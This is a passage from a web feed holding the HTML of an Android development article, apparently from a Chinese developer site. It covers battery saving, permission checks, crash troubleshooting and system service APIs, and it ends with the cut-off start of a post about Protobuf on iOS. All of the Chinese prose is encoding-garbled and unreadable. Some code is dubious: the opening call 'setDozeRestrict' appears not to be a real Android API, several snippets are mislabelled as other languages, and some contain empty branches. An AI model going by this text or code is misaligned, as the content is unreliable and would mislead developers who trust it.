    powerManager<span class="hljs-selector-class">.setDozeRestrict</span>(PowerManager.RESTRICTION_TYPE_EXEMPTED);
}
</code></pre>
<p>ä»¥ä¸Šä»£ç å±•ç¤ºäº†å¦‚ä½•åœ¨æ»¡è¶³ç‰¹å®šæ¡ä»¶æ—¶ä¸ºåº”ç”¨å¯ç”¨Dozeæ¨¡å¼ï¼Œä»è€Œè¾¾åˆ°å‡å°‘ç”µæ± æ¶ˆè€—çš„ç›®çš„ã€‚</p>
<p>é€šè¿‡ç»“åˆè¿™äº›æ€§èƒ½ä¼˜åŒ–å’Œç”µé‡èŠ‚çœç­–ç•¥ï¼Œå¼€å‘è€…å¯ä»¥æ˜¾è‘—æé«˜åº”ç”¨çš„è¿è¡Œæ•ˆç‡å’Œç”µæ± ç»­èˆªï¼Œæœ€ç»ˆè¾¾åˆ°æå‡ç”¨æˆ·æ»¡æ„åº¦çš„ç›®æ ‡ã€‚åœ¨ä¸‹ä¸€ç« ä¸­ï¼Œæˆ‘ä»¬å°†è¿›ä¸€æ­¥æ¢è®¨å¦‚ä½•ä¿æŠ¤ç”¨æˆ·çš„ä¸ªäººéšç§ä»¥åŠæ•…éšœæ’æŸ¥å’Œä¿®å¤æŠ€å·§ï¼Œç¡®ä¿åº”ç”¨çš„é•¿æœŸç¨³å®šè¿è¡Œã€‚</p>
<h2 data-id="heading-18">4. ä¿æŠ¤ä¸ªäººéšç§å’Œæ•…éšœæ’æŸ¥æŠ€å·§</h2>
<p>åœ¨å½“ä»Šæ•°å­—æ—¶ä»£ï¼Œä¸ªäººéšç§ä¿æŠ¤å’Œæ•…éšœæ’æŸ¥å·²æˆä¸ºæ¯ä¸ªç”¨æˆ·å’Œå¼€å‘è€…å…³æ³¨çš„é‡ç‚¹ã€‚æœ¬ç« å°†æ·±å…¥æ¢è®¨å¦‚ä½•ä¿æŠ¤ç”¨æˆ·éšç§ï¼Œä»¥åŠå¦‚ä½•é«˜æ•ˆåœ°è¿›è¡Œæ•…éšœæ’æŸ¥ã€‚</p>
<h3 data-id="heading-19">4.1 éšç§ä¿æŠ¤æœºåˆ¶</h3>
<p>éšç§æ³„éœ²çš„é£é™©æ— å¤„ä¸åœ¨ï¼Œè€Œä¸ªäººéšç§ä¿æŠ¤åˆ™æ˜¯ç¡®ä¿æ•°æ®å®‰å…¨å’Œä¸ªäººä¿¡æ¯å®‰å…¨çš„å…³é”®æªæ–½ã€‚ä¸‹é¢è¯¦ç»†è®²è§£éšç§æ³„éœ²çš„é£é™©ä¸é¢„é˜²ä»¥åŠåº”ç”¨æƒé™ç®¡ç†å’Œå®‰å…¨è®¾ç½®ã€‚</p>
<h4 data-id="heading-20">4.1.1 éšç§æ³„éœ²çš„é£é™©ä¸é¢„é˜²</h4>
<p>éšç§æ³„éœ²å¯èƒ½å¯¼è‡´è¯¸å¤šé—®é¢˜ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºèº«ä»½ç›—ç”¨ã€è´¢äº§æŸå¤±ã€ä¸ªäººç”Ÿæ´»è¢«å¹²æ‰°ç­‰ã€‚é¢„é˜²éšç§æ³„éœ²ä¸»è¦ä¾èµ–äºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š</p>
<ol>
<li><strong>æ•°æ®åŠ å¯†</strong> ï¼šå¯¹æ•æ„Ÿæ•°æ®è¿›è¡ŒåŠ å¯†å¤„ç†ï¼Œç¡®ä¿å³ä½¿æ•°æ®è¢«éæ³•è·å–ï¼Œä¹Ÿæ— æ³•è½»æ˜“è¢«è§£è¯»ã€‚</li>
<li><strong>æœ€å°æƒé™åŸåˆ™</strong> ï¼šåº”ç”¨ä»…è¯·æ±‚å¯¹å®Œæˆå…¶åŠŸèƒ½æ‰€å¿…éœ€çš„æœ€ä½æƒé™ï¼Œé™ä½æ•°æ®æ³„éœ²çš„é£é™©ã€‚</li>
<li><strong>å®šæœŸæ›´æ–°å’Œæ‰“è¡¥ä¸</strong> ï¼šåŠæ—¶æ›´æ–°æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºï¼Œä¿®è¡¥å·²çŸ¥çš„å®‰å…¨æ¼æ´ã€‚</li>
<li><strong>å¤šå› ç´ èº«ä»½éªŒè¯</strong> ï¼šé€šè¿‡å¢åŠ ä¸€å±‚æˆ–å¤šå±‚éªŒè¯æœºåˆ¶ï¼Œæé«˜è´¦æˆ·å®‰å…¨ã€‚</li>
<li><strong>ç”¨æˆ·æ•™è‚²</strong> ï¼šæ•™è‚²ç”¨æˆ·è¯†åˆ«é’“é±¼ã€è¯ˆéª—ç­‰å¸¸è§éšç§æ³„éœ²æ‰‹æ®µã€‚</li>
</ol>
<h4 data-id="heading-21">4.1.2 åº”ç”¨æƒé™ç®¡ç†å’Œå®‰å…¨è®¾ç½®</h4>
<p>åº”ç”¨æƒé™ç®¡ç†æ˜¯ä¿æŠ¤ç”¨æˆ·éšç§çš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚å¼€å‘è€…åº”è¯¥ï¼š</p>
<ol>
<li><strong>æ˜ç¡®æƒé™è¯·æ±‚ç›®çš„</strong> ï¼šåœ¨è¯·æ±‚æƒé™æ—¶ï¼Œæ˜ç¡®å‘ŠçŸ¥ç”¨æˆ·ä¸ºä½•éœ€è¦è¿™äº›æƒé™ã€‚</li>
<li><strong>éµå¾ªAndroidå’ŒiOSå¹³å°æŒ‡å—</strong> ï¼šåœ¨ä¸¤ä¸ªä¸»è¦çš„ç§»åŠ¨å¹³å°ä¸Šï¼Œéµå¾ªå„è‡ªçš„æƒé™ç®¡ç†æŒ‡å—å’Œæœ€ä½³å®è·µã€‚</li>
<li><strong>å®æ–½è¿è¡Œæ—¶æƒé™è¯·æ±‚</strong> ï¼šç¡®ä¿åªæœ‰åœ¨éœ€è¦æ—¶æ‰å‘ç”¨æˆ·è¯·æ±‚æƒé™ï¼Œå¹¶æä¾›é€‚å½“çš„ä¸Šä¸‹æ–‡ã€‚</li>
<li><strong>é™åˆ¶æƒé™èŒƒå›´</strong> ï¼šä»…è¯·æ±‚å¯¹å®Œæˆåº”ç”¨åŠŸèƒ½å¿…ä¸å¯å°‘çš„æƒé™ï¼Œå¹¶å°½é‡å‡å°‘æƒé™è¯·æ±‚çš„é¢‘ç‡ã€‚</li>
<li><strong>æƒé™å®¡æŸ¥</strong> ï¼šå®šæœŸå®¡æŸ¥åº”ç”¨æƒé™ï¼Œåˆ é™¤ä¸å†éœ€è¦çš„æƒé™è¯·æ±‚ã€‚</li>
</ol>
<h4 data-id="heading-22">ä»£ç ç¤ºä¾‹ï¼šæ£€æŸ¥åº”ç”¨æƒé™</h4>
<pre><code class="hljs language-arduino" lang="arduino">
<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title">checkPermission</span><span class="hljs-params">(<span class="hljs-type">String</span> permission)</span> </span>{
<span class="hljs-type">int</span> permissionCheck = ContextCompat.<span class="hljs-built_in">checkSelfPermission</span>(thisActivity, permission);
<span class="hljs-keyword">return</span> permissionCheck == PackageManager.PERMISSION_GRANTED;
}
<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">checkPermission</span>(Manifest.permission.CAMERA)) {
    ActivityCompat.<span class="hljs-built_in">requestPermissions</span>(thisActivity, <span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]{Manifest.permission.CAMERA}, REQUEST_CODE);
}
</code></pre>
<p>åœ¨è¿™ä¸ªJavaä»£ç ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ª <code>checkPermission</code> æ–¹æ³•æ¥æ£€æŸ¥åº”ç”¨æ˜¯å¦æœ‰æƒé™è®¿é—®ç›¸æœºã€‚ <code>ContextCompat.checkSelfPermission</code> æ–¹æ³•è¿”å› <code>PackageManager.PERMISSION_GRANTED</code> æˆ– <code>PackageManager.PERMISSION_DENIED</code> ï¼Œè¡¨ç¤ºæƒé™æ˜¯å¦å·²è¢«æˆäºˆã€‚å¦‚æœæƒé™æœªè¢«æˆäºˆï¼Œåˆ™ä½¿ç”¨ <code>ActivityCompat.requestPermissions</code> æ–¹æ³•å‘ç”¨æˆ·è¯·æ±‚æƒé™ã€‚</p>
<h3 data-id="heading-23">4.2 æ•…éšœæ’æŸ¥ä¸ä¿®å¤</h3>
<p>æ•…éšœæ’æŸ¥æ˜¯ç³»ç»Ÿç»´æŠ¤ä¸­çš„é‡è¦ç¯èŠ‚ã€‚å®ƒåŒ…æ‹¬è¯†åˆ«é—®é¢˜ã€å®šä½é—®é¢˜æºå¤´å’Œé‡‡å–çº æ­£æªæ–½ç­‰æ­¥éª¤ã€‚ä¸‹é¢è¯¦ç»†æ¢è®¨æ•…éšœæ’æŸ¥çš„åŸºæœ¬æµç¨‹ä»¥åŠå¦‚ä½•å¤„ç†å…¸å‹é—®é¢˜ã€‚</p>
<h4 data-id="heading-24">4.2.1 æ•…éšœæ’æŸ¥çš„åŸºæœ¬æµç¨‹</h4>
<p>æ•…éšœæ’æŸ¥çš„ä¸€èˆ¬æµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li><strong>è¯†åˆ«é—®é¢˜</strong> ï¼šé¦–å…ˆæ˜ç¡®æ•…éšœçš„è¡¨ç°å’Œå½±å“èŒƒå›´ã€‚</li>
<li><strong>æ”¶é›†ä¿¡æ¯</strong> ï¼šè®°å½•å’Œæ”¶é›†ä¸é—®é¢˜ç›¸å…³çš„æ‰€æœ‰ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ—¥å¿—ã€åº”ç”¨çŠ¶æ€å’Œç”¨æˆ·åé¦ˆç­‰ã€‚</li>
<li><strong>åˆæ­¥åˆ†æ</strong> ï¼šæ ¹æ®æ”¶é›†åˆ°çš„ä¿¡æ¯ï¼Œè¿›è¡Œåˆæ­¥çš„åˆ†æå’Œå‡è®¾ã€‚</li>
<li><strong>åˆ›å»ºå‡è®¾</strong> ï¼šæ„å»ºä¸€ä¸ªæˆ–å¤šä¸ªå¯èƒ½çš„é—®é¢˜åŸå› çš„å‡è®¾ã€‚</li>
<li><strong>æµ‹è¯•å‡è®¾</strong> ï¼šé€šè¿‡å®éªŒæ¥éªŒè¯è¿™äº›å‡è®¾ã€‚</li>
<li><strong>è§£å†³é—®é¢˜</strong> ï¼šæ ¹æ®éªŒè¯çš„ç»“æœï¼Œé‡‡å–å¿…è¦çš„è§£å†³æªæ–½ã€‚</li>
<li><strong>é¢„é˜²å¤å‘</strong> ï¼šåˆ†ææ•…éšœçš„æ ¹æœ¬åŸå› ï¼Œå¹¶åˆ¶å®šé¢„é˜²æªæ–½é˜²æ­¢æ•…éšœå†æ¬¡å‘ç”Ÿã€‚</li>
</ol>
<h4 data-id="heading-25">4.2.2 å…¸å‹é—®é¢˜çš„æ’æŸ¥å’Œè§£å†³å®ä¾‹</h4>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªå…¸å‹çš„Androidåº”ç”¨å´©æºƒæ•…éšœæ’æŸ¥çš„å®ä¾‹ï¼š</p>
<p>å‡è®¾åº”ç”¨å´©æºƒæ—¶ä¼šæŠ›å‡º <code>NullPointerException</code> ã€‚æ’æŸ¥æµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li><strong>æŸ¥çœ‹å´©æºƒæ—¥å¿—</strong> ï¼šé¦–å…ˆè·å–åº”ç”¨çš„å´©æºƒæ—¥å¿—ã€‚å¯ä»¥é€šè¿‡Android Studioæˆ–Logcatå·¥å…·æŸ¥çœ‹ã€‚</li>
<li><strong>å®šä½å´©æºƒç‚¹</strong> ï¼šæ‰¾åˆ°æŠ›å‡º <code>NullPointerException</code> çš„å †æ ˆè·Ÿè¸ªï¼Œå®šä½åˆ°å‡ºé—®é¢˜çš„ä»£ç è¡Œã€‚</li>
<li><strong>æ£€æŸ¥å˜é‡</strong> ï¼šæ£€æŸ¥è¯¥å˜é‡æ˜¯å¦åœ¨ä½¿ç”¨å‰è¢«æ­£ç¡®åˆå§‹åŒ–ã€‚</li>
<li><strong>ä¿®æ”¹ä»£ç </strong> ï¼šå¦‚æœå˜é‡æœªåˆå§‹åŒ–ï¼Œç¡®ä¿åœ¨ä½¿ç”¨å‰ä¸ºå…¶èµ‹äºˆåˆé€‚çš„å€¼ã€‚</li>
<li><strong>æµ‹è¯•åº”ç”¨</strong> ï¼šä¿®æ­£ä»£ç åé‡æ–°ç¼–è¯‘å¹¶è¿è¡Œåº”ç”¨ï¼ŒéªŒè¯é—®é¢˜æ˜¯å¦å·²è§£å†³ã€‚</li>
<li><strong>éƒ¨ç½²æ›´æ–°</strong> ï¼šå¦‚æœæµ‹è¯•æ²¡æœ‰å‘ç°é—®é¢˜ï¼Œå¯ä»¥å°†æ›´æ–°éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒã€‚</li>
</ol>
<h4 data-id="heading-26">æµç¨‹å›¾ç¤ºä¾‹ï¼šæ•…éšœæ’æŸ¥æµç¨‹</h4>
<pre><code class="hljs language-css" lang="css">graph <span class="hljs-selector-tag">TD</span>
    <span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[å¼€å§‹æ’æŸ¥]</span> --&gt; <span class="hljs-selector-tag">B</span><span class="hljs-selector-attr">[è¯†åˆ«é—®é¢˜]</span>
    <span class="hljs-selector-tag">B</span> --&gt; C<span class="hljs-selector-attr">[æ”¶é›†ä¿¡æ¯]</span>
    C --&gt; D<span class="hljs-selector-attr">[åˆæ­¥åˆ†æ]</span>
    D --&gt; E<span class="hljs-selector-attr">[åˆ›å»ºå‡è®¾]</span>
    E --&gt; F<span class="hljs-selector-attr">[æµ‹è¯•å‡è®¾]</span>
    F --&gt;|å‡è®¾æˆç«‹| G<span class="hljs-selector-attr">[è§£å†³é—®é¢˜]</span>
    F --&gt;|å‡è®¾ä¸æˆç«‹| E
    G --&gt; H<span class="hljs-selector-attr">[é¢„é˜²å¤å‘]</span>
    H --&gt; <span class="hljs-selector-tag">I</span><span class="hljs-selector-attr">[ç»“æŸæ’æŸ¥]</span>

</code></pre>
<p>åœ¨è¿™ä¸ªæµç¨‹å›¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ¸…æ™°åœ°çœ‹åˆ°æ•…éšœæ’æŸ¥çš„åŸºæœ¬æ­¥éª¤ï¼Œä»¥åŠåœ¨æµ‹è¯•å‡è®¾ä¸æˆç«‹æ—¶å¦‚ä½•è¿”å›å¹¶åˆ›å»ºæ–°çš„å‡è®¾ã€‚</p>
<p>æœ¬ç« è¯¦ç»†ä»‹ç»äº†éšç§ä¿æŠ¤æœºåˆ¶å’Œæ•…éšœæ’æŸ¥æŠ€å·§ï¼Œå¸Œæœ›è¿™äº›å†…å®¹èƒ½å¤Ÿå¸®åŠ©æ‚¨æ›´å¥½åœ°ä¿æŠ¤ç”¨æˆ·éšç§å’Œåº”å¯¹åº”ç”¨æ•…éšœã€‚ä¸‹ä¸€ç« æˆ‘ä»¬å°†æ¢è®¨ç³»ç»ŸæœåŠ¡APIåœ¨appè°ƒè¯•å’Œæ€§èƒ½ç›‘æ§ä¸­çš„åº”ç”¨ã€‚</p>
<h2 data-id="heading-27">5. ç³»ç»ŸæœåŠ¡APIåœ¨appè°ƒè¯•å’Œæ€§èƒ½ç›‘æ§ä¸­çš„åº”ç”¨</h2>
<p>ç³»ç»ŸæœåŠ¡APIä¸ºå¼€å‘äººå‘˜æä¾›äº†ä¸€ç§ä¸è®¾å¤‡ç³»ç»ŸæœåŠ¡è¿›è¡Œäº¤äº’çš„æ–¹å¼ã€‚è¿™äº›APIä½¿å¾—å¼€å‘è€…èƒ½å¤Ÿè®¿é—®ç³»ç»Ÿçº§åŠŸèƒ½ï¼Œå¦‚ç½‘ç»œçŠ¶æ€ã€ç”µæ± ä¿¡æ¯ã€ä¼ æ„Ÿå™¨æ•°æ®ç­‰ï¼Œå¹¶å°†å…¶é›†æˆåˆ°åº”ç”¨ç¨‹åºä¸­ï¼Œä»¥å¢å¼ºåº”ç”¨ç¨‹åºçš„åŠŸèƒ½å¹¶æå‡ç”¨æˆ·ä½“éªŒã€‚åœ¨æœ¬ç« ä¸­ï¼Œæˆ‘ä»¬å°†æ·±å…¥äº†è§£ç³»ç»ŸæœåŠ¡APIï¼Œå¹¶æ¢è®¨å®ƒä»¬åœ¨appè°ƒè¯•å’Œæ€§èƒ½ç›‘æ§æ–¹é¢çš„åº”ç”¨ã€‚</p>
<h3 data-id="heading-28">5.1 ç³»ç»ŸæœåŠ¡APIç®€ä»‹</h3>
<h4 data-id="heading-29">5.1.1 ç³»ç»ŸæœåŠ¡APIçš„åŠŸèƒ½ä¸ä½œç”¨</h4>
<p>ç³»ç»ŸæœåŠ¡APIä¸ºAndroidå’ŒiOSç­‰ç§»åŠ¨æ“ä½œç³»ç»Ÿæä¾›äº†ä¸°å¯Œçš„åŠŸèƒ½é›†åˆã€‚ä¾‹å¦‚ï¼ŒAndroidçš„ <code>LocationManager</code> APIå¯ä»¥è®¿é—®è®¾å¤‡çš„GPSæœåŠ¡ï¼Œè€ŒiOSçš„ <code>HealthKit</code> æ¡†æ¶åˆ™å…è®¸åº”ç”¨è®¿é—®ç”¨æˆ·çš„å¥åº·æ•°æ®ã€‚å¼€å‘è€…é€šè¿‡è¿™äº›APIä¸ä»…èƒ½å¤Ÿè·å–ç³»ç»Ÿä¿¡æ¯ï¼Œè¿˜å¯ä»¥æ‰§è¡Œç‰¹å®šçš„ä»»åŠ¡ï¼Œå¦‚æ§åˆ¶è®¾å¤‡ç¡¬ä»¶æˆ–ç›‘æ§ç³»ç»ŸçŠ¶æ€ã€‚</p>
<h4 data-id="heading-30">5.1.2 å¼€å‘è€…å¦‚ä½•åˆ©ç”¨ç³»ç»ŸæœåŠ¡API</h4>
<p>å¼€å‘è€…åˆ©ç”¨ç³»ç»ŸæœåŠ¡APIé€šå¸¸éœ€è¦æ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š</p>
<ul>
<li>ç¡®å®šéœ€è¦ä½¿ç”¨çš„ç³»ç»ŸæœåŠ¡APIçš„ç±»å‹å’ŒåŠŸèƒ½ã€‚</li>
<li>åœ¨åº”ç”¨çš„manifestæ–‡ä»¶ï¼ˆAndroidï¼‰æˆ–info.plistæ–‡ä»¶ï¼ˆiOSï¼‰ä¸­å£°æ˜ç›¸åº”çš„æƒé™ã€‚</li>
<li>åœ¨ä»£ç ä¸­åˆ›å»ºç›¸åº”çš„APIå¯¹è±¡ï¼Œå¹¶è°ƒç”¨æ‰€éœ€çš„APIæ–¹æ³•ã€‚</li>
<li>å¤„ç†å¼‚æ­¥è°ƒç”¨çš„å›è°ƒæˆ–ç»“æœï¼Œå¹¶ç¡®ä¿æ­£ç¡®ç®¡ç†æƒé™å’Œç”¨æˆ·éšç§ã€‚</li>
</ul>
<pre><code class="hljs language-ini" lang="ini">
LocationManager <span class="hljs-attr">locationManager</span> = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE)<span class="hljs-comment">;</span>
if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &amp;&amp; ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
} else {
Location <span class="hljs-attr">location</span> = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)<span class="hljs-comment">;</span>
if (location != null) {
    }
}
</code></pre>
<h3 data-id="heading-31">5.2 APIåœ¨è°ƒè¯•å’Œæ€§èƒ½ç›‘æ§ä¸­çš„åº”ç”¨æ¡ˆä¾‹</h3>
<h4 data-id="heading-32">5.2.1 å®é™…å¼€å‘ä¸­çš„åº”ç”¨åˆ†æ</h4>
<p>åœ¨åº”ç”¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œç³»ç»ŸæœåŠ¡APIç»å¸¸ç”¨äºè°ƒè¯•å’Œæµ‹è¯•é˜¶æ®µï¼Œä»¥ç¡®ä¿åº”ç”¨å¯ä»¥æ­£ç¡®å“åº”ç³»ç»Ÿäº‹ä»¶ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨Androidçš„ <code>BatteryManager</code> APIï¼Œå¼€å‘è€…å¯ä»¥æ£€æµ‹ç”µæ± çŠ¶æ€å’Œç”µé‡ä¿¡æ¯ï¼Œç¡®ä¿åº”ç”¨åœ¨ä½ç”µé‡æ¨¡å¼ä¸‹ä¾ç„¶è¡¨ç°è‰¯å¥½ã€‚å¯¹äºiOSå¼€å‘ï¼ŒKeymobç­‰å·¥å…·åˆ©ç”¨ç³»ç»ŸæœåŠ¡APIæä¾›å®æ—¶æ€§èƒ½ç›‘æ§å’Œæ—¥å¿—åˆ†æï¼Œå¸®åŠ©å¼€å‘è€…ä¼˜åŒ–åº”ç”¨æ€§èƒ½ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">
BatteryManager <span class="hljs-attr">batteryManager</span> = (BatteryManager) getSystemService(Context.BATTERY_SERVICE)<span class="hljs-comment">;</span>
int <span class="hljs-attr">status</span> = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS)<span class="hljs-comment">;</span>
boolean <span class="hljs-attr">isCharging</span> = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                     <span class="hljs-attr">status</span> == BatteryManager.BATTERY_STATUS_FULL<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-33">5.2.2 æ€§èƒ½ç›‘æ§å’Œè°ƒè¯•çš„é«˜çº§åº”ç”¨æŠ€å·§</h4>
<p>åœ¨æ€§èƒ½ç›‘æ§æ–¹é¢ï¼Œå¼€å‘è€…å¯ä»¥åˆ©ç”¨ç³»ç»ŸæœåŠ¡APIå®ç°è‡ªå®šä¹‰çš„æ€§èƒ½ç›‘æ§å·¥å…·ã€‚ä¾‹å¦‚ï¼Œç›‘æµ‹åº”ç”¨å¯åŠ¨æ—¶é—´æˆ–å“åº”æ—¶é—´ã€‚åŒæ—¶ï¼Œç»“åˆæ—¥å¿—ç³»ç»Ÿå’Œæ€§èƒ½åˆ†æå·¥å…·ï¼Œå¯ä»¥å½¢æˆä¸€å¥—å®Œæ•´çš„æ€§èƒ½ç›‘æ§è§£å†³æ–¹æ¡ˆã€‚</p>
<pre><code class="hljs language-ini" lang="ini">
long <span class="hljs-attr">startTime</span> = System.currentTimeMillis()<span class="hljs-comment">;</span>
long <span class="hljs-attr">endTime</span> = System.currentTimeMillis()<span class="hljs-comment">;</span>
Log.d("Performance", "Application startup time: " + (endTime - startTime) + "ms")<span class="hljs-comment">;</span>
</code></pre>
<p>åœ¨é«˜çº§åº”ç”¨æŠ€å·§æ–¹é¢ï¼Œå¼€å‘è€…å¯ä»¥ç»“åˆä½¿ç”¨å¤šä¸ªAPIæ¥æé«˜ç›‘æ§çš„æ·±åº¦ã€‚ä¾‹å¦‚ï¼ŒåŒæ—¶ç›‘æ§CPUå’Œå†…å­˜ä½¿ç”¨æƒ…å†µï¼Œä»¥è¯†åˆ«åº”ç”¨æ€§èƒ½ç“¶é¢ˆã€‚</p>
<pre><code class="hljs language-ini" lang="ini">
ActivityManager <span class="hljs-attr">activityManager</span> = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE)<span class="hljs-comment">;</span>
ActivityManager.MemoryInfo <span class="hljs-attr">memoryInfo</span> = new ActivityManager.MemoryInfo()<span class="hljs-comment">;</span>
activityManager.getMemoryInfo(memoryInfo)<span class="hljs-comment">;</span>
</code></pre>
<p>é€šè¿‡ä»¥ä¸Šç¤ºä¾‹ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç³»ç»ŸæœåŠ¡APIåœ¨è°ƒè¯•å’Œæ€§èƒ½ç›‘æ§ä¸­çš„å®é™…åº”ç”¨ã€‚å¼€å‘è€…é€šè¿‡ç³»ç»ŸæœåŠ¡APIä¸ä»…å¯ä»¥å¢å¼ºåº”ç”¨çš„åŠŸèƒ½ï¼Œè¿˜å¯ä»¥ç¡®ä¿åº”ç”¨åœ¨å„ç§ç¯å¢ƒä¸‹éƒ½èƒ½ç¨³å®šè¿è¡Œã€‚ç³»ç»ŸæœåŠ¡APIæ˜¯ç§»åŠ¨åº”ç”¨å¼€å‘ä¸­ä¸å¯æˆ–ç¼ºçš„ä¸€éƒ¨åˆ†ï¼ŒæŒæ¡å®ƒä»¬å¯¹äºæé«˜å¼€å‘è´¨é‡å’Œæ€§èƒ½ä¼˜åŒ–è‡³å…³é‡è¦ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç†è§£iOSä¸­Protobufï¼šä¸€ä¸ªæ¯”JSONæ›´å¥½ï¼Œä½†ä¸æ˜¯æ›¿ä»£]]></title>    <link>https://juejin.cn/post/7581306080435634227</link>    <guid>https://juejin.cn/post/7581306080435634227</guid>    <pubDate>2025-12-08T15:35:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581306080435634227" data-draft-id="7580564126402871346" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç†è§£iOSä¸­Protobufï¼šä¸€ä¸ªæ¯”JSONæ›´å¥½ï¼Œä½†ä¸æ˜¯æ›¿ä»£"/> <meta itemprop="keywords" content="iOS,æ¶æ„,æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2025-12-08T15:35:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sweetä¸¶"/> <meta itemprop="url" content="https://juejin.cn/user/3227821869921646"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç†è§£iOSä¸­Protobufï¼šä¸€ä¸ªæ¯”JSONæ›´å¥½ï¼Œä½†ä¸æ˜¯æ›¿ä»£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3227821869921646/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sweetä¸¶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T15:35:58.000Z" title="Mon Dec 08 2025 15:35:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    82
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier 